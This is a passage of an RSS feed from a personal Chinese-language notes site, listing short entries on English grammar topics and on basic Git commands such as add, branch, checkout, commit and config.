 The rabbit was eating a carrot when I reached home.  while，强调在一个时间段内。
 The rabbit was eating a carrot while I was making a vide.  as，强调同时进行两个动作。
 l ate a carrot as I made the video.</description>
    </item>
    
    <item>
      <title>English 反义疑问句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E5%8F%8D%E4%B9%89%E7%96%91%E9%97%AE%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E5%8F%8D%E4%B9%89%E7%96%91%E9%97%AE%E5%8F%A5/</guid>
      <description>反义疑问句 可以用 yes，no 回答。
前肯后否，前否后肯 陈述句部分是肯定，疑问句部分用否定句 He is your teacher, isn‘t he？(他是你的老师，不是吗？)
根据事实回答：Yes, he is
陈述句部分是否定，反义疑问句用肯定句 He isn‘t your teacher, is he？(他不是你的老师，是吗？)
根据事实回答：No, he isn’t
有祈使句的情况 用 will you 和 won’t you
Open the door, won’t you?
打开开门，不好吗？
Don’t open the door, will you?
不打开门，好吗？
不管否定肯定，let’s 开头结尾就是 shall we，Let us 开头结尾就是 will you
肯定：Let‘s go to school, shall we? Let us go outside, will you?
否定：Let‘s don’t go out, shall we?</description>
    </item>
    
    <item>
      <title>English 同位语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%90%8C%E4%BD%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%90%8C%E4%BD%8D/</guid>
      <description>同位语 用于将主语或宾语重新说一遍。使得两个不同的词语都表示同一个事物或人。
 Rainy,an english teacher,is very strict.  </description>
    </item>
    
    <item>
      <title>English 名词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E5%90%8D%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%90%8D%E8%AF%8D/%E5%90%8D%E8%AF%8D/</guid>
      <description>名词 表示人或物的名称。
 Rainy is a person  名词所有格 表示一种所有关系。
比如小明的书包，其中小明的就是所有格，因为书包是属于小明的。
表示人或动物的名词 + &amp;rsquo;s 这种名词所有格，构成的方式很容易，直接子表示人或动物的名词后面**+&amp;rsquo;s**就可以了，这里的 &amp;rsquo;s 相当于中文里的”的“。
一个普通名词，在变成所有格的时候，，要注意可数名词不能单独使用，比如 friend&amp;rsquo;s ；需要加一个限定词 my，变成My friend&amp;rsquo;s这样才能构成名词所有格。
作前置定语 Jack &amp;rsquo;s book
Jack &amp;rsquo;s books
The boss’s car
同时它作前置定语的时候可以修饰可数名词（单数和复数形式）和不可数名词。
复数名词 s 结尾，后加’ 如果名词是s结尾的复数或名词本身是s结尾， 直接加**&amp;rsquo;就可以了，当然也可以加&amp;rsquo;s**。
My boss&amp;rsquo;s 相当于 My boss&amp;rsquo;
of + 无生命的名词 不可数名词或复数直接+of。 Of water
Of oil
可数名词不能直接加 of，需要加限定词或冠词或变复数。 of相当于中文**“的”的意思，the相当于“这”**的意思
Of the house
Of my house
Of this coat
Of the carrot
被名词所有格作后置定语修饰的名词，都必须在这个名词前面+ the The price of the house.</description>
    </item>
    
    <item>
      <title>English 名词从句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%90%8D%E8%AF%8D%E4%BB%8E%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%90%8D%E8%AF%8D%E4%BB%8E%E5%8F%A5/</guid>
      <description>名词从句 主语从句 将简单句修改，使其可以充当另一个句子的主语。
 The fact is obvious. ——&amp;gt; That the rabbit ate a carrot is obvious. ——&amp;gt; It is obvious that the rabbit ate a carrot.  主语从句从都有引导词：that、whether、when、what、how 等。
 That the hungry rabbit had already eaten a carrot for dinner this evening is obvious.  这个句子显然头重脚轻了，因此得改为：
 It is obvious that the hungry rabbit had already carrot for dinner the evening is obvious.  这句话中的 It 指代的是 that the hungry rabbit had already carrot for dinner the evening。</description>
    </item>
    
    <item>
      <title>English 命令、警告</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%A5%88%E4%BD%BF%E5%8F%A5/%E5%91%BD%E4%BB%A4%E8%AD%A6%E5%91%8A/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%A5%88%E4%BD%BF%E5%8F%A5/%E5%91%BD%E4%BB%A4%E8%AD%A6%E5%91%8A/</guid>
      <description>命令、警告 Get out！（滚！）
Be quiet, please.（请安静）
Be careful（小心）</description>
    </item>
    
    <item>
      <title>English 复合句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E5%90%88%E5%8F%A5/%E5%A4%8D%E5%90%88%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E5%90%88%E5%8F%A5/%E5%A4%8D%E5%90%88%E5%8F%A5/</guid>
      <description>复合句 也叫并列句， 句与句之间没有主次之分</description>
    </item>
    
    <item>
      <title>English 复杂句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%A4%8D%E6%9D%82%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%A4%8D%E6%9D%82%E5%8F%A5/</guid>
      <description>复杂句 表示用简单句所组成的从属关系的句子；也就是表示一个句子套另一个句子，这两个句子分别叫做主句和从句。</description>
    </item>
    
    <item>
      <title>English 定语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%9A%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%9A%E8%AF%AD/</guid>
      <description>定语 用于修饰名词或代词，也可以说定语是广义的形容词，通常情况，哪里有名词，哪里就有定语。
定语可以将名词具体化，缩小名词的范围.比如你去帮我买香蕉，这句话并不具体，因为没有表示要买多少根香蕉，或者买什么种类的香蕉，因此，我们需要加上一些具体的词，使我们的句子更加合理化，这些词就是定语。
在英语中，普通名词才能用定语修饰 ，专有名词是不能用定语修饰的，特殊情况除外。
同一个普通名词，可以有多个定语修饰。
 The little white rabbit ate a large carrot. One book a bottle of water Two beautiful girls  前置定语 放在名词前面修饰名词的词语。
后置定语 放在名词后面修饰名词的词语。</description>
    </item>
    
    <item>
      <title>English 宾补</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%BE%E8%A1%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%BE%E8%A1%A5/</guid>
      <description>宾补 对宾语进行补充说明，使得句子意思完整。
宾补只跟宾语有关系，跟主语没关系。
 He made the English class funny I make you rich. We keep the room clean.  </description>
    </item>
    
    <item>
      <title>English 宾语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%BE%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E5%AE%BE%E8%AF%AD/</guid>
      <description>宾语 指动作（谓语）的承受者。
能作主语的词都可以作宾语，不能作主语的，也不能作宾语。但要注意的是，如果是人称代词作宾语，则必须用宾格，不能用主格。
 I buy a book every year. You believe us I want two apples.  和表语不同，宾语前面不需要也不能有系动词 be.
间宾 一般来说， 我们把表示人的称为间接宾语。
间宾和直宾的位置是可以换的，如果间宾放直宾的后面，那么要在间宾的前面＋ to.
 Rainy teaches you English I gave a book to her I gave them books  直宾 我们把表示物的称为直接宾语。
 Rainy teaches you English  与宾补的区别 主语 + 及物动词 + 宾语 + 名词（作宾语）
主语 + 及物动词 + 宾语 + 名词（作宾补）
  I gave her a book.</description>
    </item>
    
    <item>
      <title>English 形容词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%BD%A2%E5%AE%B9%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E5%BD%A2%E5%AE%B9%E8%AF%8D/</guid>
      <description>形容词 用于修饰名词的词，简称 adj.
普通形容词 单独一个单词的形容词。
当形容词作定语的时候，前面必须加一个冠词 。
 She is a beautifu girl. he has a big house. He was angry now. I am very sad right now. I am smart person.  复合形容词 指的是由两个单词构成的一个新的形容词，两个单词之间有一个符号“-”
 sky-blue good-looking man-made second-hand  形容词的先后顺序 当出现几个形容词同时修饰名词作前置定语的时候，这时候我们就要考虑这些形容词在一句话中的先后顺序。
 冠词（a、an、the ）、物主代词（my）、数词（three）、指示代词等 描绘性的形容词 beautiful 表示形状、大小、长短、高矮。 表示年龄或者新旧。 表示颜色。 表示出处、来源。 表示材料，物质 表示用途  但一般情况下，同时修饰一个名词的形容词数量不会超过 4 个，多了就不是特别好了。、
形容词的比较级和最高级 大部分的形容词都有三个格式：原级、比较级、最高级。比较级就是相当于中文里面”更”的意思，最高级就相当于“最”的意思。
比如：漂亮的是一个形容词，更漂亮是一个比较级，最漂亮是一个最高级。
一个形容词的比较级和最高级的用法和原级是一样的，都可以作定语、表语和宾补。
A 超过 B A + be + 形容词比较级 + than + B.</description>
    </item>
    
    <item>
      <title>English 形容词从句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%BD%A2%E5%AE%B9%E8%AF%8D%E4%BB%8E%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E5%A4%8D%E6%9D%82%E5%8F%A5/%E5%BD%A2%E5%AE%B9%E8%AF%8D%E4%BB%8E%E5%8F%A5/</guid>
      <description>形容词从句 将简单句修改，使它成为另一个句子的定语。也叫定语从句或关系从句。
定语从句都是后置的。
从句由先行词 + 关系词，组成，关系词可以分为关系代词和关系副词。
 a carrot that I bought.  关系词 先行词 + 关系代词
先行词是唯一的，用 that.
 The rebbit ate the largest carrot that I&amp;rsquo;ve ever seen. The only rebbit that ate a carrot  先行词多选一，用 which.
 The rebbit ate a carrot which I bought.  关系副词 关系副词相当于介词+关系副词
where、why 、when
限定性形容词性从句 The rabbit ate the carrot which was on the table.
其中 **which was on the table **限定了 carrot 的范围，which 相当于 the carrot</description>
    </item>
    
    <item>
      <title>English 感叹词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E6%84%9F%E5%8F%B9%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E6%84%9F%E5%8F%B9%E8%AF%8D/</guid>
      <description>感叹词 用于表示感叹或发出某种情感，通常处于句子的最前面或最后面，一般与句子本身没有实际的直接联系，简称 int.
比如 What、yum、blah 等都是叹词。
在 Ah，the apple is tasty 中，Ah 是叹词。</description>
    </item>
    
    <item>
      <title>English 数词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E6%95%B0%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E6%95%B0%E8%AF%8D/</guid>
      <description>数词 用于表示数量、数字、第几的词.
例句  The first is important. Eight is a number  基数词 表示数量的数词，比如一、二、三。
100 ~ 999 一 = one
十 = ten
百 = hundred
千 = thousand
万 = ten thousand
十万 = one hundred
百万 = one million
一亿 = one hundred million
十亿 = one billion
百亿 = ten billion
千亿 = myriads
特点 作数词时候，前面可以加数词，后面不能加 s，two thousand，three thousands（错）
如果数词用作名词时候，意思是好几…的时候，前面可以加 some、many、several 这种词或者加数词，后面可以加 of
hundreds of（好几百）
five hundreds of（五百左右）</description>
    </item>
    
    <item>
      <title>English 特殊疑问句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E7%89%B9%E6%AE%8A%E7%96%91%E9%97%AE%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E7%89%B9%E6%AE%8A%E7%96%91%E9%97%AE%E5%8F%A5/</guid>
      <description>特殊疑问句 不可以用 yes、no 回答的疑问句。
特殊疑问句是对句子中的某个句子成分提问，用特殊疑问词开头，下面列举一些特殊疑问词。
特殊疑问词 Who 提问人，是谁？
 Who’s next? Who is the richet? Who is in my room?  Whose 提问所属，谁的？。
 Whose car is this? Whose money do you spend? Whose car will Jeff drive after class?  Whom 提问宾格人 Who 的宾格。
 Whom did you choose for our them leader?     Whom do you love?      What 提问事情属性，是什么？
 What time is it?</description>
    </item>
    
    <item>
      <title>English 状语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E7%8A%B6%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E7%8A%B6%E8%AF%AD/</guid>
      <description>状语 用于修饰谓语动词，它只跟谓语有关系。
xxx 的执行某个动作，xxx 就是状语。
 The rabbit ate quickly I teach English in Beijing I am happy in Guizhou I am happy today I am busy now I will buy a book tomorrow I speak English slowly  一句话里面可以使用多个状语，但有的时候可能逻辑不对。
 I always eat bread every day.  这个句子语法没问题，但是逻辑有矛盾，因为“总是吃”不代表“每天吃”，两者的频率是不同的“每天吃”的频率比“总是吃”要高很多。
如果改成下面这个句子就对了：
 I always eat bread in the morning.  把 every day 换成 in the morning，就不会和 always 逻辑冲突了。</description>
    </item>
    
    <item>
      <title>English 简单句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%AE%80%E5%8D%95%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%AE%80%E5%8D%95%E5%8F%A5/</guid>
      <description>简单句 陈述句 肯定式 i have money
肯定式边否定式，助动词（do）后面，加否定词（not）
否定式 i don’t have money
疑问句 感叹句 祈使句 </description>
    </item>
    
    <item>
      <title>English 表语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E8%A1%A8%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E8%A1%A8%E8%AF%AD/</guid>
      <description>表语 说明主语怎么怎么样，是谓语的一部分。
表语和系动词 be 不能分开使用，没有系动词就没有表语，没有表语就没有系动词，因此，系动词后面的词大部分都是表语。
  I am rich
  You are my friend
  We are in the classroom
  </description>
    </item>
    
    <item>
      <title>English 语气词 &#43; 感叹号</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/%E8%AF%AD%E6%B0%94%E8%AF%8D-&#43;-%E6%84%9F%E5%8F%B9%E5%8F%B7/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E6%84%9F%E5%8F%B9%E5%8F%A5/%E8%AF%AD%E6%B0%94%E8%AF%8D-&#43;-%E6%84%9F%E5%8F%B9%E5%8F%B7/</guid>
      <description>语气词 + 感叹号 Wow! That’s totally awesome!
哇！真是厉害！
Oh! You’re Peter！
哇！你是皮特！</description>
    </item>
    
    <item>
      <title>English 请求、祝愿</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%A5%88%E4%BD%BF%E5%8F%A5/%E8%AF%B7%E6%B1%82%E7%A5%9D%E6%84%BF/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%A5%88%E4%BD%BF%E5%8F%A5/%E8%AF%B7%E6%B1%82%E7%A5%9D%E6%84%BF/</guid>
      <description>请求、祝愿 Have a good day（祝你有美好的一天）
Let me help you（让我帮你）</description>
    </item>
    
    <item>
      <title>English 谓语</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E8%B0%93%E8%AF%AD/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%AD%90%E6%88%90%E5%88%86/%E8%B0%93%E8%AF%AD/</guid>
      <description>谓语 一般在主语之后，用于说明主语的动作、状态、特征和行为。
动作型谓语 用于说明主语做什么。
一般由谓语动词构成。
例句  I eat an apple everyday  简单谓语 由实义动词或复合动词构成。
例句  I wrok every day. I run every run. I love you. She looks after her brother. I git up at six  复合谓语 由简单谓语 + 其他词语，共同作谓语的情况。
情态动词 + 实义动词/复合动词的原形  I can speak Cantonese I can look after her  助动词 ＋ 实义动词/复合动词的原形  I will buy a new book tomorrow. I will get up early tomorrow.</description>
    </item>
    
    <item>
      <title>English 连词</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E8%BF%9E%E8%AF%8D/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E8%BF%9E%E8%AF%8D/</guid>
      <description>连词 用来连接词与词、词组与词组、句子与句子，使得形成某种逻辑关系或语法结构的词。简称 conj.
连词可以表并列、承接、转折、因果、选择、假设、比较、让步等关系。
1、并列连词
and 和，那么，渐渐
or 或，否则，不管是…，还是
but 但是，而是，的确…但
nor 也不
so 也是，因此，所以，那么，这样看来
for 因为（表示推测），由于
2、相关连词
both A and B 既是 A 又是 B
either A or B 不是 A 就是 B
neither A nor B 既不是 A 也不是 B，两者皆非
not only A but also B 不但 A 而且 B
A as well as B 不但 A 而且 B ,与，和
3、准连词
而且 besides, furthermore, moreover, in addition
然而 yet, still, however, nevertheless</description>
    </item>
    
    <item>
      <title>English 选择疑问句</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E9%80%89%E6%8B%A9%E7%96%91%E9%97%AE%E5%8F%A5/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E5%8F%A5%E5%9E%8B/%E7%AE%80%E5%8D%95%E5%8F%A5/%E7%96%91%E9%97%AE%E5%8F%A5/%E9%80%89%E6%8B%A9%E7%96%91%E9%97%AE%E5%8F%A5/</guid>
      <description>选择疑问句 不可以用 yes，no 回答
选择疑问句用 or 连接，一般是提问两个以上的句子内容，我们选择其中一个进行回答。
选择疑问句：Do you like to play football or basketball?（你喜欢踢球还是打篮球？）
回答：I like to play football./I like to play basketball.</description>
    </item>
    
    <item>
      <title>Git git add</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-add/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-add/</guid>
      <description>git add 将我们需要提交的代码从工作区添加到暂存区，也就是告诉 git ，我们要提交哪些文件。之后就可以使用git commit命令进行提交了。
git add . 添加当前目录所有的文件，. 表示当前目录的所有文件夹。
git add FileName 添加文件名为 FileNmae 的文件，FileNmae 代表需要被添加的文件的名字，比如 git add ReadMe.txt，即表示添加这个 ReadMe.txt 文件，
添加多个文件时，文件名使用空格分开即可 git add FileName1 FileName2 FileName3 多次 git add git add FileName1 git add FileName2 git add FileName3 git add -f git add .不会添加被**.gitignore忽略的文件，而git add -f . 强制添加所有文件，即使是被.gitignore**忽略的文件也添加。</description>
    </item>
    
    <item>
      <title>Git git add</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-branch/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-branch/</guid>
      <description>git branch 一般用于对分支的操作，比如创建分支，查看分支等等，
git branch 不带参数：列出本地已经存在的分支，并且在当前分支的前面用*****标记
一个新的本地仓库，必须在git add且git commit之后，再使用git branch命令，才能显示出本地分支master。
git branch BranchName 创建名为BranchName的分支，创建分支时需要是最新（当前分支的代码已经git commit）的环境，并且创建分支后依然停留在当前分支。
git branch -d BranchName 删除名为BranchName的分支，如果在分支中有一些未merge的提交，那么会删除分支失败，此时可以使用git branch -D BranchName强制删除名为BranchName的分支
git branch &amp;ndash;set-upstream-to=origin/dev LocalDev 将名为LocalDev的本地分支与名为origin/dev的远程分支相关联。</description>
    </item>
    
    <item>
      <title>Git git checkout</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-checkout/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-checkout/</guid>
      <description>git checkout $ git checkout &amp;ndash;File 清空名为File文件的修改，注意不要忘记中间的 &amp;ndash;，，如果不加 &amp;ndash;，就变成了切换到 FileName 分支的命令。
$ git checkout -- ReadMe.txt git checkout . 清空在工作区中，对文件所作的所有修改，**.**表示当前目录的所有文件夹。
git checkout Branch to track remote branch &amp;#39;BranchName&amp;#39; from &amp;#39;origin&amp;#39;. 将当前分支切换到名为BranchName的分支
git checkout -b BranchName -b 参数相当于以下两条命令
git branch BranchName git checkout BranchName git checkout -b LocalBranch origin/RemoteBranch 在本地创建一个名为LocalBranch的分支，并创建一个名为RemoteBranch的远程分支。
这个远程分支和本地分支相对应，另外，本地和远程分支的名称最好一致。</description>
    </item>
    
    <item>
      <title>Git git cherry-pick</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-cherry-pick/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-cherry-pick/</guid>
      <description>git cherry-pick 对于多分支的代码库，将代码从一个分支转移到另一个分支是常见需求。
这时分两种情况。一种情况是，你需要另一个分支的所有代码变动，那么就采用合并（git merge）。另一种情况是，你只需要部分代码变动（某几个提交），这时可以采用 Cherry pick。
git cherry-pick commitHash 将指定的commitHash，应用于当前分支。这会在当前分支产生一个新的提交，当然它们的哈希值会不一样。</description>
    </item>
    
    <item>
      <title>Git git clone</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-clone/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-clone/</guid>
      <description>git clone 拷贝一个远程库到本地，让自己能够查看该项目，或者进行修改。
git clone RemoteAddress 克一个RemoteAddress到本地。</description>
    </item>
    
    <item>
      <title>Git git commit</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-commit/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-commit/</guid>
      <description>git commit 将暂存区中的内容添加到本地仓库，相当于确认提交暂存区中的内容。
每次使用git commit命令我们都会在本地版本库生成一个 40 位的哈希值，这个哈希值也叫 commit-id， commit-id 在版本回退的时候是非常有用的，它相当于一个快照，可以在未来的任何时候通过与git reset的组合命令回到这里.
git commit -m ‘message’ -m 参数表示可以直接输入后面的 “message”，如果不加 -m 参数，那么是不能直接输入 message 的，而是会调用一个编辑器一般是 vim 来让你输入这个 message。message 即是我们用来简要说明这次提交的语句，比如对文件进行了哪些修改、谁进行的修改等等。
常见错误 用 git 提交的时候，报错:
pathspec &amp;#39;commit&amp;#39;&amp;#39; did not match any file(s) known to git 后来发现用单引号提交报错，改成双引号就成功了
git commit -m &amp;#34;first commit&amp;#34; </description>
    </item>
    
    <item>
      <title>Git git config alias</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-config-alias/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-config-alias/</guid>
      <description>git config alias git config alias.ShorthandName OriginalName 将git OriginalName命令修改（通常为简写）为git ShorthandName，且只对当前 Git 仓库有效，配置文件在当前仓库的**.git/config**中。
git config &amp;ndash;global alias.ShorthandName OriginalName 加上--global参数可以对当前用户下的所有仓库起作用，配置文件在 C 盘用户目录下的一个**.gitconfig**文件中。</description>
    </item>
    
    <item>
      <title>Git git config user</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-config-user/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-config-user/</guid>
      <description>git config user git config user.name &amp;ldquo;UserName&amp;rdquo; git config user.email &amp;ldquo;Email&amp;rdquo; 对当前仓库设置名为UserName的用户名和名为Email的邮箱。
git config &amp;ndash;global user.name &amp;ldquo;UserName&amp;rdquo; git config &amp;ndash;global user.email &amp;ldquo;Email&amp;rdquo; git config命令的–global参数，表示你这台机器上所有的 Git 仓库都会使用这个配置，当然也可以对不同的仓库指定不同的用户名和 Email 地址。</description>
    </item>
    
    <item>
      <title>Git git diff</title>
      <link>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-diff/</link>
      <pubDate>Thu, 21 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/git/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/git-diff/</guid>
      <description>git diff git diff 比较暂存区与工作区中文件之间的差异，可以让我们知道这些文件具体修改了些什么。</description>
    </item>
    
    <item>
